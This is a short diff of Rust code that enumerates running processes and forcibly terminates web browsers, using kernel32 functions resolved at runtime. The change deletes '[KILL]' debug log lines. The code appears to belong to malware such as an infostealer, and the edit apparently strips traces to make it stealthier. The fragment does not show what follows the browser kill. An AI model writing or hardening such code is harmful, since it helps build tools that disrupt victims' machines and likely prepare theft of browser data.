@@ -147,7 +147,6 @@ fn kill_browser_processes(
                     close_handle,
                     entry.th32_process_id,
                 );
-                crate::dbg_log!("[KILL] crashed {} (pid={})", exe, entry.th32_process_id);
             }
 
             if proc_next(snap, &mut entry) == 0 {
@@ -177,7 +176,6 @@ pub fn kill_browsers() {
 
     let (Some(cs), Some(pf), Some(pn), Some(op), Some(term), Some(ch)) =
         (create_snap, proc_first, proc_next, open_proc, terminate, close_handle) else {
-        crate::dbg_log!("[KILL] failed to resolve kernel32 functions");
         return;
     };
 
@@ -188,7 +186,6 @@ pub fn kill_browsers() {
     kill_browser_processes(cs, pf, pn, op, term, ch);
 
     std::thread::sleep(std::time::Duration::from_millis(1000));
-    crate::dbg_log!("[KILL] browser crash complete");
 }
 
 type FnMoveFileExW = unsafe extern "system" fn(*const u16, *const u16, u32) -> i32;
